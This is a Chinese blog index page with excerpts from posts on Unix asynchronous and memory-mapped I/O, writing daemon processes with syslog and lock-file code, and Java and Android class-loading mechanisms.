<h2 id="异步I-O"><a href="#异步I-O" class="headerlink" title="异步I/O"></a>异步I/O</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;aio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">aio_read</span><span class="params">(struct aiocb *aiocb)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">aio_write</span><span class="params">(struct aiocb *aiocb)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">aio_fsync</span><span class="params">(<span class="keyword">int</span> op, struct aiocb *aiocb)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">aio_error</span><span class="params">(<span class="keyword">const</span> struct aiocb *aiocb)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">aio_return</span><span class="params">(<span class="keyword">const</span> struct aiocb *aiocb)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">aio_suspend</span><span class="params">(<span class="keyword">const</span> struct aiocb *<span class="keyword">const</span> list[], <span class="keyword">int</span> nent, <span class="keyword">const</span> struct timespec *timeout)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">aio_cancel</span><span class="params">(<span class="keyword">int</span> fd, struct aiocb *aiocb)</span></span>;</span><br></pre></td></tr></table></figure>

<h2 id="函数readv和writev"><a href="#函数readv和writev" class="headerlink" title="函数readv和writev"></a>函数readv和writev</h2><p>readv和writev函数用于在一次函数调用中读、写多个非连续缓冲区。有时也将这两个函数称为散布读（scatter read）和聚集写（gather write）。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/uio.h&gt;</span>s</span></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">readv</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">const</span> struct iovec *iov, <span class="keyword">int</span> iovcnt)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">writev</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">const</span> struct iovec *iov, <span class="keyword">int</span> iovcnt)</span></span>;</span><br></pre></td></tr></table></figure>

<h2 id="函数readn和writen"><a href="#函数readn和writen" class="headerlink" title="函数readn和writen"></a>函数readn和writen</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">readn</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> nbytes)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">writen</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> nbytes)</span></span>;</span><br></pre></td></tr></table></figure>

<h2 id="存储映射I-O"><a href="#存储映射I-O" class="headerlink" title="存储映射I/O"></a>存储映射I/O</h2><p>存储映射I/O（memory-mapped I/O）能将一个磁盘文件映射到存储空间中的一个缓冲区上，于是，当从缓冲区中取数据时，就相当于读文件中的相应字节。与此类似，将数据存入缓冲区时，相应字节就自动写入文件。这样，就可以在不使用read和write的情况下执行I/O。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mmap</span><span class="params">(<span class="keyword">void</span> *addr, <span class="keyword">size_t</span> len, <span class="keyword">int</span> prot, <span class="keyword">int</span> flag, <span class="keyword">int</span> fd, <span class="keyword">off_t</span> off)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">munmap</span><span class="params">(<span class="keyword">void</span> *addr, <span class="keyword">size_t</span> len)</span></span></span><br></pre></td></tr></table></figure>

<p>返回值：若成功，返回映射区的起始地址；若出错，返回MAP_FAILED。</p>
<p>addr参数用于指定映射存储区的起始地址。通常将其设置为0，这表示由系统选择该映射区的起始地址。此函数的返回值是该映射区的起始地址。</p>
<p>fd参数是指定要被映射文件的描述符。在文件映射到地址空间之前，必须先打开该文件。</p>
<p>len参数是映射的字节数，</p>
<p>off是要映射字节在文件中的起始偏移量（有关off值的一些限制将在后面说明）。</p>
<p>prot参数指定了映射存储区的保护要求，可将prot参数指定为PROT_NONE，也可指PROT_READ、PROT_WRITE和PROT_EXEC的任意组合的按位或。对指定映射存储区的保护要求不能超过文件open模式访问权限。例如，若该文件是只读打开的，那么对映射存储区就不能指定PROT_WRITE。</p>
<pre><code>注意：子进程能通过fork继承存储映射区（因为子进程复制父进程地址空间，而存储映射区是该地址空间中的一部分），但是由于同样的原因，新程序则不能通过exec继承存储映射区。
调用mprotect可以更改一个现有映射的权限。
</code></pre>

	
	</div>
  <a type="button" href="/2021/09/02/高级IO/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/08/30/守护进程/" >Unix守护进程</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-08-30  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	

		
        
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		

	

	</div>
  <a type="button" href="/2021/08/30/守护进程/#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>系统进程依赖于操作系统实现。父进程ID为0的各进程通常是内核进程，它们作为系统引导装入过程的一部分而启动。（init是个例外，它是一个由内核在引导装入时启动的用户层次的命令。）内核进程是特殊的，通常存在于系统的整个生命期中。它们以超级用户特权运行，无控制终端，无命令行。<br>在ps的输出实例中，内核守护进程的名字出现在方括号中。该版本的Linux使用一个名为kthreadd的特殊内核进程来创建其他内核进程，所以kthreadd表现为其他内核进程的父进程。对于需要在进程上下文执行工作但却不被用户层进程上下文调用的每一个内核组件，通常有它自己的内核守护进程。例如，在Linux中：kswapd守护进程也称为内存换页守护进程。它支持虚拟内存子系统在经过一段时间后将脏页面慢慢地写回磁盘来回收这些页面。</p>
<p>flush守护进程在可用内存达到设置的最小阈值时将脏页面冲洗至磁盘。它也定期地将脏页面冲洗回磁盘来减少在系统出现故障时发生的数据丢失。多个冲洗守护进程可以同时存在，每个写回的设备都有一个冲洗守护进程。输出实例中显示出一个名为flush-8:0的冲洗守护进程。从名字中可以看出，写回设备是通过主设备号（8）和副设备号（0）来识别的。</p>
<p>sync_supers守护进程定期将文件系统元数据冲洗至磁盘。</p>
<p>jbd守护进程帮助实现了ext4文件系统中的日志功能。<br>进程1通常是init（Mac OS X中是launchd<br>），8.2节对此做过说明。它是一个系统守护进程，除了其他工作外，主要负责启动各运行层次特定的系统服务。这些服务通常是在它们自己拥有的守护进程的帮助下实现的。</p>
<p>rpcbind守护进程提供将远程过程调用（Remote Procedure Call，RPC）程序号映射为网络端口号的服务。rsyslogd<br>守护进程可以被由管理员启用的将系统消息记入日志的任何程序使用。可以在一台实际的控制台上打印这些消息，也可将它们写到一个文件中。（13.4节将对syslog<br>设施进行说明。）</p>
<p>inetd守护进程。它侦听系统网络接口，以便取得来自网络的对各种网络服务进程的请求。nfsd、nfsiod、lockd、rpciod、rpc.idmapd、rpc.statd和rpc.mountd守护进程提供对网络文件系统（Network File System，NFS）的支持。注意，前4个是内核守护进程，后3个是用户级守护进程。</p>
<p>cron守护进程在定期安排的日期和时间执行命令。许多系统管理任务是通过cron<br>每隔一段固定的时间就运行相关程序而得以实现的。atd守护进程与cron<br>类似，它允许用户在指定的时间执行任务，但是每个任务它只执行一次，而非在定期安排的时间反复执行。cupsd守护进程是个打印假脱机进程，它处理对系统提出的各个打印请求。sshd<br>守护进程提供了安全的远程登录和执行设施。</p>
<h2 id="守护进程的编程规则"><a href="#守护进程的编程规则" class="headerlink" title="守护进程的编程规则"></a>守护进程的编程规则</h2><p>在编写守护进程程序时需遵循一些基本规则，以防止产生不必要的交互作用。</p>
<p>（1）首先要做的是调用umask将文件模式创建屏蔽字设置为一个已知值（通常是0）。由继承得来的文件模式创建屏蔽字可能会被设置为拒绝某些权限。如果守护进程要创建文件，那么它可能要设置特定的权限。例如，若守护进程要创建组可读、组可写的文件，继承的文件模式创建屏蔽字可能会屏蔽上述两种权限中的一种，而使其无法发挥作用。另一方面，如果守护进程调用的库函数创建了文件，那么将文件模式创建屏蔽字设置为一个限制性更强的值（如007）可能会更明智，因为库函数可能不允许调用者通过一个显式的函数参数来设置权限。</p>
<p>（2）调用fork，然后使父进程exit。这样做实现了下面几点。第一，如果（1）首先要做的是调用umask将文件模式创建屏蔽字设置为一个已知值（通常是0）。由继承得来的文件模式创建屏蔽字可能会被设置为拒绝某些权限。如果守护进程要创建文件，那么它可能要设置特定的权限。例如，若守护进程要创建组可读、组可写的文件，继承的文件模式创建屏蔽字可能会屏蔽上述两种权限中的一种，而使其无法发挥作用。另一方面，如果守护进程调用的库函数创建了文件，那么将文件模式创建屏蔽字设置为一个限制性更强的值（如007）可能会更明智，因为库函数可能不允许调用者通过一个显式的函数参数来设置权限。</p>
<p>（3）调用setsid创建一个新会话。然后执行9.5节中列出的3个步骤，使调用进程：（a）成为新会话的首进程，（b）成为一个新进程组的组长进程，（c）没有控制终端。</p>
<pre><code>在基于System V的系统中，有些人建议在此时再次调用fork，终止父进程，继续使用子进程中的守护进程。这就保证了该守护进程不是会话首进程，于是按照System V规则,可以防止它取得控制终端。为了避免取得控制终端的另一种方法是，无论何时打开一个终端设备，都一定要指定O_NOCTTY。
</code></pre>
<p>（4）将当前工作目录更改为根目录。从父进程处继承过来的当前工作目录可能在一个挂载的文件系统中。因为守护进程通常在系统再引导之前是一直存在的，所以如果守护进程的当前工作目录在一个挂载文件系统中，那么该文件系统就不能被卸载。或者，某些守护进程还可能会把当前工作目录更改到某个指定位置，并在此位置进行它们的全部工作。例如，行式打印机假脱机守护进程就可能将其工作目录更改到它们的spool目录上。</p>
<p>（5）关闭不再需要的文件描述符。这使守护进程不再持有从其父进程继承来的任何文件描符（父进程可能是shell进程，或某个其他进程）。可以使用open_max函数（见2.17节）或getrlimit函数（见7.11节）来判定最高文件描述符值，并关闭直到该值的所有描述符。</p>
<p>（6）某些守护进程打开/dev/null使其具有文件描述符0、1和2，这样，任何一个试图读标准输入、写标准输出或标准错误的库例程都不会产生任何效果。因为守护进程并不与终端设备相关联，所以其输出无处显示，也无处从交互式用户那里接收输入。即使守护进程是从交互式会话启动的，但是守护进程是在后台运行的，所以登录会话的终止并不影响守护进程。如果其他用户在同一终端设备上登录，我们不希望在该终端上见到守护进程的输出，用户也不期望他们在终端上的输入被守护进程读取。</p>
<h2 id="出错记录"><a href="#出错记录" class="headerlink" title="出错记录"></a>出错记录</h2><p>守护进程存在的一个问题是如何处理出错消息。因为它本就不应该有控制终端，所以不能只是简单地写到标准错误上。我们不希望所有守护进程都写到控制台设备上，因为在很多工作站上控制台设备都运行着一个窗口系统。我们也不希望每个守护进程将它自己的出错消息写到一个单独的文件中。对任何一个系统管理人员而言，如果要关心哪一个守护进程写到哪一个记录文件中，并定期地检查这些文件，那么一定会使他感到头痛。所以，需要有一个集中的守护进程出错记录设施。</p>
<p>有以下3种产生日志消息的方法。<br>（1）内核例程可以调用 log 函数。任何一个用户进程都可以通过打开（open）并读取（read）/dev/klog设备来读取这些消息。因为我们无意编写内核例程，所以不再进一步说明此函数。</p>
<p>（2）大多数用户进程（守护进程）调用syslog(3)函数来产生日志消息。我们将在下面说明其调用序列。这使消息被发送至UNIX域数据报套接字/dev/log。</p>
<p>（3）无论一个用户进程是在此主机上，还是在通过TCP/IP网络连接到此主机的其他主机上，都可将日志消息发向UDP端口514。注意，syslog函数从不产生这些UDP数据报，它们要求产生此日志消息的进程进行显式的网络编程。</p>
<p>关于UNIX域套接字以及UDP套接字的细节，请参阅Stevens、Fenner和Rudoff[2004]。<br>通常，syslogd守护进程读取所有3种格式的日志消息。此守护进程在启动时读一个配置文件，其文件名一般为/etc/syslog.conf，该文件决定了不同种类的消息应送向何处。例如，紧急消息可发送至系统管理员（若已登录），并在控制台上打印，而警告消息则可记录到一个文件中。</p>
<p>该设施的接口是syslog函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;syslog.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">openlog</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *ident, <span class="keyword">int</span> option, <span class="keyword">int</span> facility)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">syslog</span><span class="params">(<span class="keyword">int</span> priority, <span class="keyword">const</span> <span class="keyword">char</span> *format, ...)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">closelog</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">setlogmask</span><span class="params">(<span class="keyword">int</span> maskpri)</span></span>;</span><br></pre></td></tr></table></figure>

<p>调用openlog是可选择的。如果不调用openlog，则在第一次调用syslog时，自动调用openlog。调用closelog也是可选择的，因为它只是关闭曾被用于与syslogd守护进程进行通信的描述符。</p>
<p>调用openlog使我们可以指定一个ident，以后，此ident将被加至每则日志消息中。ident一般是程序的名称（如cron、inetd）。option参数是指定各种选项的位屏蔽。图13-3介绍了可用的option（选项）。若在Single UNIXSpecification的openlog定义中包括了该选项，则在XSI列中用一个黑点表示。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;apue.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;syslog.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">daemonize</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *cmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i, fd0, fd1, fd2;</span><br><span class="line">  <span class="keyword">pid_t</span> pid;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span>　<span class="title">rl</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span>　<span class="title">sa</span>;</span></span><br><span class="line">  <span class="comment">/*      * Clear file creation mask.      */</span></span><br><span class="line">  <span class="built_in">umask</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*      * Get maximum number of file descriptors.      */</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getrlimit</span>(RLIMIT_NOFILE, &amp;rl) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">err_quit</span>(<span class="string">&quot;%s: can&#x27;t get file limit&quot;</span>, cmd);</span><br><span class="line">  <span class="comment">/*      * Become a session leader to lose controlling TTY.      */</span> <span class="keyword">if</span> ((pid = fork()) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">err_quit</span>(<span class="string">&quot;%s: can&#x27;t fork&quot;</span>, cmd);</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (pid != <span class="number">0</span>) <span class="comment">/* parent */</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setsid</span>();</span><br><span class="line">  <span class="comment">/*      * Ensure future opens won&#x27;t allocate controlling TTYs.      */</span></span><br><span class="line">  sa.sa_handler = SIG_IGN;</span><br><span class="line">  <span class="built_in">sigemptyset</span>(&amp;sa.sa_mask);</span><br><span class="line">  sa.sa_flags = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">sigaction</span>(SIGHUP, &amp;sa, <span class="literal">NULL</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">err_quit</span>(<span class="string">&quot;%s: can&#x27;t ignore SIGHUP&quot;</span>, cmd);</span><br><span class="line"></span><br><span class="line">  　 <span class="keyword">if</span> ((pid = fork()) &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="built_in">err_quit</span>(<span class="string">&quot;%s: can&#x27;t fork&quot;</span>, cmd);</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (pid != <span class="number">0</span>) <span class="comment">/* parent */</span></span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="comment">/*      * Change the current working directory to the root so      * we won&#x27;t prevent file systems from being unmounted.      */</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">chdir</span>(<span class="string">&quot;/&quot;</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">err_quit</span>(<span class="string">&quot;%s: can&#x27;t change directory to /&quot;</span>, cmd);</span><br><span class="line">  <span class="comment">/*      * Close all open file descriptors.      */</span></span><br><span class="line">  <span class="keyword">if</span> (rl.rlim_max == RLIM_INFINITY)</span><br><span class="line">    rl.rlim_max = <span class="number">1024</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; rl.rlim_max; i++)</span><br><span class="line">    <span class="built_in">close</span>(i);</span><br><span class="line">  <span class="comment">/*      * Attach file descriptors 0, 1, and 2 to /dev/null.      */</span></span><br><span class="line">  fd0 = <span class="built_in">open</span>(<span class="string">&quot;/dev/null&quot;</span>, O_RDWR);</span><br><span class="line">  fd1 = <span class="built_in">dup</span>(<span class="number">0</span>);</span><br><span class="line">  fd2 = <span class="built_in">dup</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="comment">/*      * Initialize the log file.      */</span></span><br><span class="line">  <span class="built_in">openlog</span>(cmd, LOG_CONS, LOG_DAEMON);</span><br><span class="line">  <span class="keyword">if</span> (fd0 != <span class="number">0</span> || fd1 != <span class="number">1</span> || fd2 != <span class="number">2</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">syslog</span>(LOG_ERR, <span class="string">&quot;unexpected file descriptors %d %d %d&quot;</span>, fd0, fd1, fd2);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="单实例守护进程"><a href="#单实例守护进程" class="headerlink" title="单实例守护进程"></a>单实例守护进程</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;syslog.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOCKFILE <span class="meta-string">&quot;/var/run/daemon.pid&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOCKMODE (S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH)</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">lockfile</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">already_running</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span>    fd;</span><br><span class="line">    <span class="keyword">char</span>    buf[<span class="number">16</span>];</span><br><span class="line">    fd = <span class="built_in">open</span>(LOCKFILE, O_RDWR | O_CREAT, LOCKMODE);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">         <span class="built_in">syslog</span>(LOG_ERR, <span class="string">&quot;can&#x27;t open %s: %s&quot;</span>, LOCKFILE, <span class="built_in">strerror</span>(errno));</span><br><span class="line">         <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">lockfile</span>(fd) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">         <span class="keyword">if</span> (errno == EACCES || errno == EAGAIN)</span><br><span class="line">         &#123;</span><br><span class="line">              <span class="built_in">close</span>(fd);</span><br><span class="line">              <span class="keyword">return</span> (<span class="number">1</span>);</span><br><span class="line">          </span><br><span class="line">         &#125;</span><br><span class="line">         <span class="built_in">syslog</span>(LOG_ERR, <span class="string">&quot;can&#x27;t lock %s: %s&quot;</span>, LOCKFILE, <span class="built_in">strerror</span>(errno));</span><br><span class="line">         <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">ftruncate</span>(fd, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;%ld&quot;</span>, (<span class="keyword">long</span>)<span class="built_in">getpid</span>());</span><br><span class="line">    <span class="built_in">write</span>(fd, buf, <span class="built_in">strlen</span>(buf) + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> (<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

	
	</div>
  <a type="button" href="/2021/08/30/守护进程/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/08/20/Android-Java类加载机制/" >Java类加载机制</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-08-20  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	

		
        
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		

	

	</div>
  <a type="button" href="/2021/08/20/Android-Java类加载机制/#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<h2 id="JVM的类加载器包括3种"><a href="#JVM的类加载器包括3种" class="headerlink" title="JVM的类加载器包括3种"></a>JVM的类加载器包括3种</h2><p>　　1）Bootstrap ClassLoader（引导类加载器）</p>
<p>　　C/C++代码实现的加载器，用于加载指定的JDK的核心类库，比如java.lang.、java.uti.等这些系统类。Java虚拟机的启动就是通过Bootstrap ，该Classloader在java里无法获取，负责加载/lib下的类。<br>　　2）Extensions ClassLoader（拓展类加载器）</p>
<p>　　Java中的实现类为ExtClassLoader，提供了除了系统类之外的额外功能，可以在java里获取，负责加载/lib/ext下的类。<br>　　3）Application ClassLoader（应用程序类加载器）</p>
<p>　　Java中的实现类为AppClassLoader，是与我们接触对多的类加载器，开发人员写的代码默认就是由它来加载，ClassLoader.getSystemClassLoader返回的就是它。</p>
<p>也可以自定义类加载器，只需要通过继承java.lang.ClassLoader类的方式来实现自己的类加载器即可。</p>
<p>加载顺序：</p>
<ol>
<li>Bootstrap CLassloder</li>
<li>Extention ClassLoader</li>
<li>AppClassLoader</li>
</ol>
<p>双亲委派机制：</p>
<p>双亲委派模式的工作原理的是;如果一个类加载器收到了类加载请求，它并不会自己先去加载，而是把这个请求委托给父类的加载器去执行，如果父类加载器还存在其父类加载器，则进一步向上委托，依次递归，请求最终将到达顶层的启动类加载器，如果父类加载器可以完成类加载任务，就成功返回，倘若父类加载器无法完成此加载任务，子加载器才会尝试自己去加载，这就是双亲委派模式，即每个儿子都不愿意干活，每次有活就丢给父亲去干，直到父亲说这件事我也干不了时，儿子自己想办法去完成，这个就是双亲委派。</p>
<p>1）避免重复加载，如果已经加载过一次Class，可以直接读取已经加载的Class<br>2）更加安全，无法自定义类来替代系统的类，可以防止核心API库被随意篡改</p>
<p>类加载：</p>
<p>类加载的时机：<br>1、隐式加载：<br>创建类的实例<br>访问类的静态变量，或者为静态变量赋值<br>调用类的静态方法<br>使用反射方式来强制创建某个类或接口对应的java.lang.Class对象<br>初始化某个类的子类<br>2、显示加载：两者又有所区别<br>使用LoadClass（）加载<br>使用forName（）加载<br>通过源码分析Android下类加载的流程</p>
<p>1、装载：查找和导入Class文件<br>2、链接：其中解析步骤是可以选择的<br>（a）检查：检查载入的class文件数据的正确性<br>（b）准备：给类的静态变量分配存储空间<br>（c）解析：将符号引用转成直接引用<br>3、初始化：即调用&lt;clinit&gt;函数，对静态变量，静态代码块执行初始化工作</p>
<h2 id="Android的类加载器"><a href="#Android的类加载器" class="headerlink" title="Android的类加载器"></a>Android的类加载器</h2><p>Android系统中与ClassLoader相关的一共有8个：</p>
<p>ClassLoader为抽象类；</p>
<p>BootClassLoader预加载常用类，单例模式。与Java中的BootClassLoader不同，它并不是由C/C++代码实现，而是由Java实现的；</p>
<p>BaseDexClassLoader是PathClassLoader、DexClassLoader、InMemoryDexClassLoader的父类，类加载的主要逻辑都是在BaseDexClassLoader完成的。</p>
<p>SecureClassLoader继承了抽象类ClassLoader，拓展了ClassLoader类加入了权限方面的功能，加强了安全性，其子类URLClassLoader是用URL路径从jar文件中加载类和资源。</p>
<p>其中重点关注的是PathClassLoader和DexClassLoader。</p>
<p>PathClassLoader是Android默认使用的类加载器，一个apk中的Activity等类便是在其中加载。</p>
<p>DexClassLoader可以加载任意目录下的dex/jar/apk/zip文件，比PathClassLoader更灵活，是实现插件化、热修复以及dex加壳的重点。</p>
<p>Android8.0新引入InMemoryDexClassLoader，从名字便可看出是用于直接从内存中加载dex。</p>

	
	</div>
  <a type="button" href="/2021/08/20/Android-Java类加载机制/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
